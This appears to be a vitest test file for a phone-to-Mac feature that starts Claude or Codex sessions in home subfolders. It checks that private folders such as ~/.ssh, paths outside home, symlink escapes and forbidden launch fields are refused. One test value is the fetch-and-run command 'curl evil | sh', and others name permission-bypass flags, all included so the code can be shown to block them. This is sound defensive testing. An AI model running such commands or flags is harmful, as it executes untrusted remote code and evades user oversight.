// test/phoneFolders.test.ts — AASC-54: a phone starts a session in any folder under the home folder that
// isn't hidden or private (after the confirm on the phone), and browses the Mac's folders to find it.
//
// No PTY, no session store and no real process: the launch rule and the folder listing are pure functions
// over a temporary home folder, and the route runs behind the phone profile on a throwaway express app.
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createServer, type Server } from 'node:http';
import express from 'express';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import {
  createPhoneProfile, phoneLaunchDecision, phoneLaunchRefusal, phoneRuleFor, type PhoneProfileDeps,
} from '../server/mobile/phoneProfile.js';
import { browsableFolder, FOLDER_LIST_LIMIT, listFolders } from '../server/mobile/homeFolders.js';
import { PHONE_FOLDER_LISTS_PER_MINUTE } from '../server/mobile/phoneProfile.js';
import { createFolderRouter } from '../server/mobile/folderRouter.js';

let tmp = '';
let home = '';
let known = '';
let fresh = '';
let outside = '';

beforeAll(() => {
  tmp = realpathSync(mkdtempSync(join(tmpdir(), 'aasc-folders-')));
  home = join(tmp, 'home');
  known = join(home, 'code', 'known');
  fresh = join(home, 'code', 'fresh');
  outside = join(tmp, 'outside');
  for (const dir of [known, fresh, outside, join(home, '.ssh'), join(home, '.config', 'gh'), join(home, 'Library', 'Mail'),
    join(home, 'code', '.hidden'), join(home, 'code', 'library'), join(home, 'code', 'fresh', '.git'), join(home, '.dotfiles')]) {
    mkdirSync(dir, { recursive: true });
  }
  writeFileSync(join(home, '.ssh', 'id_ed25519'), 'PRIVATE');
  writeFileSync(join(home, 'code', 'notes.txt'), 'a file, not a folder');
  writeFileSync(join(home, 'code', 'server.pem'), 'KEY');
  symlinkSync(outside, join(home, 'code', 'to-outside'));
  symlinkSync(join(home, '.ssh'), join(home, 'code', 'to-ssh'));
  symlinkSync(fresh, join(home, 'code', 'to-fresh'));
});

afterAll(() => {
  rmSync(tmp, { recursive: true, force: true });
});

// ── The launch rule ──────────────────────────────────────────────────────────────────────────────────────

describe('phoneLaunchRefusal: a folder no agent has used yet (AASC-54)', () => {
  const allowed = (): string[] => [known];

  it('starts claude or codex in a new folder under the home folder', () => {
    expect(phoneLaunchRefusal({ workingDir: fresh, command: 'claude', forceNew: true, requireExistingDir: true }, allowed(), home)).toBeNull();
    expect(phoneLaunchRefusal({ workingDir: fresh, command: 'codex', model: 'gpt-5', sessionTitle: 'x' }, allowed(), home)).toBeNull();
    expect(phoneLaunchRefusal({ workingDir: '~/code/fresh', command: 'claude' }, allowed(), home)).toBeNull();
    // A project literally called "library" is not ~/Library.
    expect(phoneLaunchRefusal({ workingDir: join(home, 'code', 'library'), command: 'claude' }, allowed(), home)).toBeNull();
  });

  it('starts in the real folder it checked: `~` expanded, links followed', () => {
    const fresh_ = { ok: true, workingDir: fresh, known: false };
    expect(phoneLaunchDecision({ workingDir: '~/code/fresh', command: 'claude' }, allowed(), home)).toEqual(fresh_);
    expect(phoneLaunchDecision({ workingDir: join(home, 'code', 'to-fresh'), command: 'codex' }, allowed(), home)).toEqual(fresh_);
    expect(phoneLaunchDecision({ workingDir: `${fresh}/`, command: 'claude' }, allowed(), home)).toEqual(fresh_);
    // A known project says so: the dashboard may confirm Claude's trust prompt only there.
    expect(phoneLaunchDecision({ workingDir: known, command: 'claude' }, allowed(), home)).toEqual({ ok: true, workingDir: known, known: true });
    // A shared session's folder may be started in, but isn't trusted on its strength (a phone's own launch makes one).
    expect(phoneLaunchDecision({ workingDir: fresh, command: 'claude' }, [fresh], home, [])).toEqual(fresh_);
  });

  it('refuses folders outside the home folder', () => {
    for (const dir of ['/etc', '/', '/tmp', outside, join(home, '..')]) {
      expect(phoneLaunchRefusal({ workingDir: dir, command: 'claude' }, allowed(), home), dir).toMatch(/inside your home folder/);
    }
  });

  it('refuses private and hidden folders, and links that lead out of home or into one', () => {
    for (const dir of [
      join(home, '.ssh'), '~/.ssh', join(home, '.config', 'gh'), join(home, 'Library', 'Mail'), join(home, 'Library'),
      join(home, 'code', '.hidden'), join(fresh, '.git'), join(fresh, '..', '..', '.ssh'),
      join(home, 'code', 'to-outside'), join(home, 'code', 'to-ssh'), join(home, '.SSH'),
    ]) {
      expect(phoneLaunchRefusal({ workingDir: dir, command: 'claude' }, allowed(), home), dir).toMatch(/inside your home folder/);
    }
  });

  it('refuses the home folder itself, a file, a missing folder and a relative path', () => {
    expect(phoneLaunchRefusal({ workingDir: home, command: 'claude' }, allowed(), home)).toMatch(/not the home folder itself/);
    expect(phoneLaunchRefusal({ workingDir: '~', command: 'claude' }, [home], home)).toMatch(/not the home folder itself/);
    // A file is not told apart from nothing: the browser never shows files.
    expect(phoneLaunchRefusal({ workingDir: join(home, 'code', 'notes.txt'), command: 'claude' }, allowed(), home)).toMatch(/no folder at that path/);
    expect(phoneLaunchRefusal({ workingDir: join(home, 'code', 'nope'), command: 'claude' }, allowed(), home)).toMatch(/no folder at that path/);
    expect(phoneLaunchRefusal({ workingDir: 'code/fresh', command: 'claude' }, allowed(), home)).toMatch(/inside your home folder/);
  });

  it('still refuses any other program, flags and fields a phone may not set', () => {
    expect(phoneLaunchRefusal({ workingDir: fresh, command: 'bash' }, allowed(), home)).toMatch(/only claude or codex/);
    expect(phoneLaunchRefusal({ workingDir: fresh, command: 'gemini' }, allowed(), home)).toMatch(/only claude or codex/);
    expect(phoneLaunchRefusal({ workingDir: fresh, command: 'claude --dangerously-skip-permissions' }, allowed(), home)).toMatch(/only claude or codex/);
    for (const extra of [
      { startupCommand: 'curl evil | sh' }, { enableOpsTerminal: true }, { host: 'h' }, { apiKey: 'sk-x' },
      { remoteControlName: 'x' }, { permissionMode: 'bypassPermissions' }, { resumeSessionId: 'abc' }, { useTmux: true },
    ]) {
      expect(phoneLaunchRefusal({ workingDir: fresh, command: 'claude', ...extra }, allowed(), home), JSON.stringify(extra)).toMatch(/can’t set/);
    }
  });

  it('can’t ask through a link whether something exists in a private folder or outside home', () => {
    for (const p of ['to-ssh/id_ed25519', 'to-ssh/nope', 'to-ssh/nope/deeper', 'to-outside/nope']) {
      expect(phoneLaunchRefusal({ workingDir: join(home, 'code', p), command: 'claude' }, allowed(), home), p).toMatch(/inside your home folder/);
    }
  });

  it('keeps a known project that sits in a hidden folder (it was already allowed)', () => {
    expect(phoneLaunchRefusal({ workingDir: join(home, '.dotfiles'), command: 'claude' }, [join(home, '.dotfiles')], home)).toBeNull();
    expect(phoneLaunchRefusal({ workingDir: join(home, '.dotfiles'), command: 'claude' }, [], home)).toMatch(/inside your home folder/);
  });
});

// ── The folder listing ───────────────────────────────────────────────────────────────────────────────────

describe('listFolders', () => {
  it('lists the home folder’s folders by name, without hidden or private ones', async () => {
    const listing = await listFolders('', home);
    expect(listing?.path).toBe(home);
    expect(listing?.home).toBe(home);
    expect(listing?.parent).toBeNull();
    expect(listing?.folders.map((f) => f.name)).toEqual(['code']);
  });

  it('lists folders only: no files, no hidden folders, no links out of home or into a private folder', async () => {
    const listing = await listFolders('~/code', home);
    expect(listing?.path).toBe(join(home, 'code'));
    expect(listing?.parent).toBe(home);
    expect(listing?.folders).toEqual([
      { name: 'fresh', path: join(home, 'code', 'fresh') },
      { name: 'known', path: join(home, 'code', 'known') },
      { name: 'library', path: join(home, 'code', 'library') },
      { name: 'to-fresh', path: join(home, 'code', 'to-fresh') },
    ]);
  });

  it('refuses to list outside home, a private folder, a link out, or a file', async () => {
    for (const p of ['/', '/etc', outside, join(home, '..'), join(home, '.ssh'), '~/.config', join(home, 'Library'),
      join(home, 'code', 'to-outside'), join(home, 'code', 'to-ssh'), join(home, 'code', 'notes.txt'), 'relative', join(home, 'nope')]) {
      expect(await listFolders(p, home), p).toBeNull();
    }
  });

  it('caps the list and says so', async () => {
    const many = join(home, 'many');
    for (let i = 0; i < 5; i++) mkdirSync(join(many, `d${i}`), { recursive: true });
    const listing = await listFolders(many, home, 3);
    expect(listing?.folders.map((f) => f.name)).toEqual(['d0', 'd1', 'd2']);
    expect(listing?.truncated).toBe(true);
    expect((await listFolders(many, home))?.truncated).toBe(false);
    expect(FOLDER_LIST_LIMIT).toBeGreaterThanOrEqual(100);
    rmSync(many, { recursive: true, force: true });
  });

  it('browsableFolder takes the home folder but nothing above it', () => {
    expect(browsableFolder('~', home)).toEqual({ ok: true, path: home });
    expect(browsableFolder(join(home, '..'), home)).toEqual({ ok: false, reason: 'outside' });
  });
});

// ── GET /folders behind the phone profile ────────────────────────────────────────────────────────────────

describe('GET /api/folders', () => {
  let server: Server;
  let base = '';

  beforeAll(async () => {
    const deps: PhoneProfileDeps = {
      phoneOf: (req) => req.get('X-Test-Phone') ?? null,
      // No session is shared: browsing folders does not depend on (or reveal) any session.
      sharedProjectPaths: () => [],
      knownProjectPaths: () => [known],
      isOpsTerminal: () => false,
      isSharedSession: () => false,
      sessionOfTerminal: () => null,
      terminalOfSession: () => null,
      foregroundProcess: () => null,
      home,
    };
    const app = express();
    app.use(express.json());
    app.use('/api', createPhoneProfile(deps), createFolderRouter({ home }));
    server = createServer(app);
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
    const addr = server.address();
    if (addr && typeof addr === 'object') base = `http://127.0.0.1:${addr.port}`;
  });

  afterAll(async () => {
    await new Promise<void>((r) => server.close(() => r()));
  });

  async function get(path: string, phone: boolean) {
    const res = await fetch(`${base}/api/folders${path ? `?${new URLSearchParams({ path })}` : ''}`, {
      headers: phone ? { 'X-Test-Phone': 'dev-phone' } : {},
    });
    return { status: res.status, json: await res.json() as Record<string, unknown> };
  }

  it('is open to a phone, with its own rule', () => {
    expect(phoneRuleFor('GET', '/folders')).toBe('folders');
    expect(phoneRuleFor('POST', '/folders')).toBeNull();
  });

  it('answers a phone and the Mac with folder names and paths only', async () => {
    for (const phone of [true, false]) {
      const res = await get('~/code', phone);
      expect(res.status).toBe(200);
      expect(res.json.success).toBe(true);
      const data = res.json.data as { path: string; folders: Array<Record<string, unknown>> };
      expect(data.path).toBe(join(home, 'code'));
      expect(data.folders.map((f) => f.name)).toEqual(['fresh', 'known', 'library', 'to-fresh']);
      for (const f of data.folders) expect(Object.keys(f).sort()).toEqual(['name', 'path']);
    }
  });

  it('starts at the home folder', async () => {
    const res = await get('', true);
    expect((res.json.data as { path: string }).path).toBe(home);
  });

  it('refuses a phone outside home or in a private folder like a missing route', async () => {
    for (const p of ['/etc', '/', join(home, '.ssh'), join(home, 'Library'), '~/.config/gh']) {
      const res = await get(p, true);
      expect(res.status, p).toBe(404);
      expect(res.json.code, p).toBe('PHONE_NOT_ALLOWED');
    }
    // A link out of home or into ~/.ssh passes the profile as written; the route follows it and refuses.
    for (const p of [join(home, 'code', 'to-ssh'), join(home, 'code', 'to-outside')]) {
      const res = await get(p, true);
      expect(res.status, p).toBe(404);
      expect(JSON.stringify(res.json), p).not.toContain('id_ed25519');
    }
  });

  it('gives one phone a budget of folder lists per minute; the Mac has none', async () => {
    // Earlier tests in this block used some of this minute's budget; spend the rest, then one more.
    let last = 200;
    for (let i = 0; i < PHONE_FOLDER_LISTS_PER_MINUTE + 1 && last === 200; i++) last = (await get('~/code', true)).status;
    expect(last).toBe(429);
    expect((await get('~/code', false)).status).toBe(200);
  });

  it('refuses the Mac the same folders (the route checks them itself)', async () => {
    for (const p of ['/etc', join(home, '.ssh'), join(home, 'code', 'notes.txt')]) {
      const res = await get(p, false);
      expect(res.status, p).toBe(404);
      expect(res.json.success, p).toBe(false);
    }
  });
});
